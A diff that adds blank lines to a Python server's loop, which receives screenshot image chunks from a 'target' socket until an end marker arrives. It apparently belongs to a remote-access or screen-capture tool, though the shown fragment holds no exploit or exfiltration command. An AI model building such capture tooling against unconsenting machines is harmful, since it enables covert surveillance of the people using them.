@@ -91,12 +91,14 @@ class Server:
                 while True:
                     # Receive the image chunk
                     image_chunk = self.target_socket.recv(1024)
+
                     # Check if the received chunk is the last part of the image
                     if b"END_OF_IMAGE" in image_chunk:
                         screen_shot.write(image_chunk[:-len(b"END_OF_IMAGE")])
                         break
                     else:
                         screen_shot.write(image_chunk)
+
         except Exception as e_screenshot:
             print(f"Screenshot error: {e_screenshot}")
 
